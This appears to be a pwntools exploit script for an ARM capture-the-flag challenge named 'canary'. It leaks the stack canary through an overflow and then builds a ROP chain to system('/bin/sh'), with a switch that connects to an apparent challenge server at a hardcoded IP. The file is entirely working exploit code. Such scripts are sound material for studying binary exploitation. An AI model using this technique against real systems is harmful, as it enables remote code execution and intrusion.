from pwn import *
import commands

#context.log_level = 'debug'

pop_r0_pc   = 0x26b7c  # pop {r0, r4, pc};  by ropper
bin_sh_addr = 0x71eb0
system_addr = 0x16d90

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "116.203.30.62"
  PORT = 18113
  s = remote(HOST, PORT)
else:
  #s = process(["qemu-arm-static", "-g", "1337", "./canary"])
  s = process(["qemu-arm-static", "./canary"])

s.recvuntil("> ")
s.send("A"*41)

s.recvuntil("A"*41)
r = s.recv(3)
canary = u32("\x00" + r)
print "canary =", hex(canary)

s.recvuntil("> ")
buf  = "A"*40
buf += p32(canary)
buf += "B"*12
buf += p32(pop_r0_pc)
buf += p32(bin_sh_addr)
buf += "C"*4
buf += p32(system_addr)
s.send(buf)

s.recvuntil("> ")
s.send("\n")

s.interactive()